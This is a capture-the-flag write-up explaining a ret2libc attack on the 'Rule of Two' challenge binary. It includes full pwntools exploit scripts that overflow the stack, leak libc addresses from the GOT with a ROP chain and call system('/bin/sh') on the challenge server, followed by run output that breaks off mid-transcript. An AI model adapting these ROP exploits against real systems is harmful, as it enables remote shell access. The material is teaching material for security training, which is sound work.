# Rule of Two

The description for this challenge was as follows:

*"Always there are two. No more or no less." - Yoda*

*Submit /sith.txt flag from 0.cloud.chals.io:20712*

This was considered a hard challenge, and it was worth 375 points at the end of the competition. It uses the same binary and netcat connection as the Vader challenge, and I would recommend reading my writeup of that challenge as a pre-requisite for this one: https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/space_heroes_22/vader. As an aside, the solution presented for this challenge also doubles as an alternative valid solution to Vader.

**TL;DR Solution:** Decide that ret2libc is probably the most straightforward path to vicory. Leak libc addresses from the GOT, use them to identity the library being used, then calculate the offsets to the system function and a "/bin/sh" string in order to pop a shell.

## Deciding on an Approach

For this challenge, I believe that the intended solution was to simply leverage the functions already present in the binary to open "sith.txt" and read its contents to the terminal. This would have used a combination of fopen, fgets, and puts or printf; fgets would read the string "sith.txt" into a writable section of memory, that address would be used as the first argument of fopen to open the file, fgets would be used again to read the flag files contents into writable memory, and puts or printf would be used to write those contents to the terminal. However, I had some trouble getting the file descriptors for fgets to work, and I decided it would be much easier to just use ret2libc.

## What is ret2libc?

At this point, I am going to borrow heavily from another writeup I did on this topic, available here: https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/Imaginary_CTF/speedrun

Basically, a ret2libc attack requires you to create a short ROP chain that leaks one or more libc addresses, returns to main to allow additional input, then calls an additional ROP chain that leverages functions and offsets within the libc, such as system. You will typically need to leak libc every time that the program is run because ASLR will cause the base offset to change every time that the program is run, just like addresses on the stack.

A great target for leaking libc addresses is GOT and PLT entries. These are used in the program to provide links within the code section to the libc section, so in a non-PIE binary, they will be at known, constant locations. There should be one of each for every function in the program from libc; in this case, these include functions like fgets, puts, and printf. When the program initially starts, all the GOT entries are set to the addresses of the second instruction in PLT entries.

When functions are called, it is actually the PLT functions that are called. The first instruction of the PLT function is to jump to whatever is pointed to by the contents of the GOT entry. If the function has never been called before, this simply pings it back to the next line of PLT, which, presumably by dark magic, will locate the corresponding function in libc, execute it, and add its address to the GOT entry. If the function has already been executed before, the GOT entry will contain the corresponding libc address, and there will be no need for the dark magic linking ritual. For reference, here is what the GOT table looks like in GDB-GEF towards the start of the program, before most of the libc functions have ever been executed.
```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 7

[0x405018] puts@GLIBC_2.2.5  →  0x401036
[0x405020] setbuf@GLIBC_2.2.5  →  0x7ffff7e55c50
[0x405028] printf@GLIBC_2.2.5  →  0x401056
[0x405030] fgets@GLIBC_2.2.5  →  0x401066
[0x405038] strcmp@GLIBC_2.2.5  →  0x401076
[0x405040] fopen@GLIBC_2.2.5  →  0x401086
[0x405048] exit@GLIBC_2.2.5  →  0x401096
```
And here is what it looks like toward the end of the main function:
```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 7

[0x405018] puts@GLIBC_2.2.5  →  0x7ffff7e4e5a0
[0x405020] setbuf@GLIBC_2.2.5  →  0x7ffff7e55c50
[0x405028] printf@GLIBC_2.2.5  →  0x7ffff7e2be10
[0x405030] fgets@GLIBC_2.2.5  →  0x7ffff7e4c7b0
[0x405038] strcmp@GLIBC_2.2.5  →  0x401076
[0x405040] fopen@GLIBC_2.2.5  →  0x401086
[0x405048] exit@GLIBC_2.2.5  →  0x401096
```
Here is what the before and after addresses point to:
```
gef➤  x/5i 0x401036
   0x401036 <puts@plt+6>:       push   0x0
   0x40103b <puts@plt+11>:      jmp    0x401020
   0x401040 <setbuf@plt>:       jmp    QWORD PTR [rip+0x3fda]        # 0x405020 <setbuf@got.plt>
   0x401046 <setbuf@plt+6>:     push   0x1
   0x40104b <setbuf@plt+11>:    jmp    0x401020
gef➤  x/5i 0x7ffff7e4e5a0
   0x7ffff7e4e5a0 <__GI__IO_puts>:      endbr64
   0x7ffff7e4e5a4 <__GI__IO_puts+4>:    push   r14
   0x7ffff7e4e5a6 <__GI__IO_puts+6>:    push   r13
   0x7ffff7e4e5a8 <__GI__IO_puts+8>:    push   r12
   0x7ffff7e4e5aa <__GI__IO_puts+10>:   mov    r12,rdi
```
All of this means that the GOT contains libc addresses, so if we can just print them to the console, we have an effective libc leak. Typically, we can accomplish this by using any libc function for which a PLT address is available that writes to the console; puts and printf are preferred since they can do it with control over the rdi register (this sets your parameter for a function in x86-64). Essentially, you can just pop a GOT entry into libc, add the PLT entry for puts, then call main again so that you can actually use your leak in a fresh chain.

Now on to more Rule of Two-specific content!

## Implementing Ret2libc

### Identifying the Libc

Based on the solution to Vader, we know how to create a simple ROP chain. So, the first step here is to create one where the first parameter/rdi register is filled with an address from the GOT, the puts function is called so that the contents of that address are printed to the console, and then the main function is called to give me a second opportunity to write a ropchain leveraging the libc leak. We also need to make sure to save the leaked address to a variable so that calculations can be performed on it, which is fortunately very doable with pwntools.

Here is the script to do exactly that:
```
from pwn import *

local = 0
if local == 1:
	target = process('./vader')

	pid = gdb.attach(target, "\nb *main+68\n set disassembly-flavor intel\ncontinue")
else:
	target = remote('0.cloud.chals.io', 20712)
    
elf = ELF('vader')

pop_rdi = 0x000000000040165b	
pop_rsi_r15 = 0x0000000000401659
pop_rcx_rdx = 0x00000000004011cd
pop_r8 = 0x00000000004011d9
pop_rdx = 0x00000000004011ce


print(target.recvuntil(b'Now I am the master >>>'))
payload = cyclic(200)
padding = b'a' * 40
payload = padding
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

target.sendline(payload)

leak = target.recvuntil(b'MMMMMMMMMMMMMMM').strip(b'\nMMMMMMMMMMMMMMM')[1:]
print(leak)
puts_libc = u64(leak+ b'\x00' * 2)


print(target.recvuntil(b'Now I am the master >>>'))
print(hex(puts_libc))

target.interactive()
```
And here is what that looks like when run:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ python3 rule_of_two_exploit.py
[+] Opening connection to 0.cloud.chals.io on port 20712: Done
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b"MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK\nMMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3\nMMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF\nMMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM\nMMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3\nMMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM\nMMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3\nMMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM\nMMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM\nMMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM\nMMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM\nMMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM\nMMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM\nMMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM\nMMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM\nMMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM\nMMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM\nMMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM\nMMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM\nMMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM\nMMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM\nMMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM\nMMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM\nMMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM\nMXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM\nNxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW\nxd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO\n,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l\n.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.\nx,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;\nMNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N\nMMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM\nMMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n\n When I left you, I was but the learner. Now I am the master >>>"
b'\xe0-\x8a\xcf\xf8\x7f'
b"MMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK\nMMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3\nMMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF\nMMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM\nMMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3\nMMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM\nMMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3\nMMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM\nMMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM\nMMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM\nMMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM\nMMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM\nMMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM\nMMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM\nMMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM\nMMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM\nMMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM\nMMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM\nMMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM\nMMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM\nMMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM\nMMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM\nMMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM\nMMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM\nMXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM\nNxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW\nxd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO\n,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l\n.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.\nx,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;\nMNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N\nMMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM\nMMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n\n When I left you, I was but the learner. Now I am the master >>>"
0x7ff8cf8a2de0
[*] Switching to interactive mode
 $
```
Now, the libc was not provided for this challenge, but there are ways to figure out what it is based on the leaks. When techniques like ASLR and PIE are used, the last three nibbles/hex digits of functions still stay the same between runs; for instance, in whatever libc is being run for this library, the last three nibbles of puts will always be de0. If we collect several of these function-to-last-three-nibble mapping and plug them into services like https://libc.blukat.me/ or https://libc.rip/, we can usually figure out which libc is being used, download it, and use it to find offsets to things like the system function within libc based on the leaks available in the GOT. 

So, for this binary, I leaked addresses for puts, printf, and fgets and tried them on both of the libc identificaton sites. libc.blukat.me came up with nothing, but libc.rip came up with several options. The first one I downloaded and tried was "libc6_2.33-3_amd64.so", and it ultimately worked, so we can say that this or a similar libc was that used on the remote server.

![image](https://user-images.githubusercontent.com/10614967/161559510-5038276d-4bd3-4c8c-8aea-392c90631275.png)

### Getting a Shell

At this point, we can determine exactly where the system() function and '/bin/sh' string are in the binary. We can do this by subtracting the offset of puts from the libc leak to get the base address of libc on any given run, then adding the offsets of those locations to that base. Pwntools can do this in a fairly automated fashion like so:
```
libc = ELF('libc6_2.33-3_amd64.so')
libc_base = puts_libc - libc.symbols['puts']
system_libc = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
```
Then, we can just make a ropchain to call system('/bin/sh', 0, 0), and insert it into our second opportunity to provide input that we've made by calling main() a second time after getting the initial leak.

Here is the full exploit script:
```
from pwn import *

local = 0
if local == 1:
	target = process('./vader')

	pid = gdb.attach(target, "\nb *main+68\n set disassembly-flavor intel\ncontinue")
    #If you want to test this locally, you can insert a line of
    #libc = ELF(insert location of libc.so file used locally here)
else:
	target = remote('0.cloud.chals.io', 20712)
	libc = ELF('libc6_2.33-3_amd64.so')
    
elf = ELF('vader')

pop_rdi = 0x000000000040165b	
pop_rsi_r15 = 0x0000000000401659
pop_rcx_rdx = 0x00000000004011cd
pop_r8 = 0x00000000004011d9
pop_rdx = 0x00000000004011ce


print(target.recvuntil(b'Now I am the master >>>'))
payload = cyclic(200)
padding = b'a' * 40
payload = padding
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

target.sendline(payload)

leak = target.recvuntil(b'MMMMMMMMMMMMMMM').strip(b'\nMMMMMMMMMMMMMMM')[1:]
print(leak)
puts_libc = u64(leak+ b'\x00' * 2)


print(target.recvuntil(b'Now I am the master >>>'))
print(hex(puts_libc))

libc_base = puts_libc - libc.symbols['puts']
system_libc = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = padding
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi_r15)
payload += p64(0) * 2
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(system_libc)
target.sendline(payload)

target.interactive()

target.interactive()
```
And here is what it looks like when run against the remote target:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes$ python3 rule_of_two_exploit.py
[+] Opening connection to 0.cloud.chals.io on port 20712: Done
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes/libc6_2.33-3_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/space_heroes/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b"MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK\nMMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3\nMMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF\nMMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM\nMMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3\nMMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM\nMMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3\nMMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM\nMMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM\nMMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM\nMMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM\nMMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM\nMMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM\nMMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM\nMMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM\nMMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM\nMMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM\nMMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM\nMMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM\nMMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM\nMMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM\nMMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM\nMMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM\nMMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM\nMXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM\nNxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW\nxd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO\n,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l\n.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.\nx,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;\nMNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N\nMMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM\nMMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n\n When I left you, I was but the learner. Now I am the master >>>"
b'\xe0m\xb4\xb0\xd4\x7f'
b"MMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK\nMMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3\nMMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF\nMMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM\nMMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3\nMMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM\nMMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3\nMMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM\nMMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM\nMMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM\nMMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM\nMMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM\nMMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM\nMMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM\nMMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM\nMMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM\nMMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM\nMMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM\nMMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM\nMMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM\nMMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM\nMMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM\nMMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM\nMMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM\nMMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM\nMXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM\nNxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW\nxd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO\n,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l\n.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.\nx,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;\nMNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N\nMMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM\nMMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  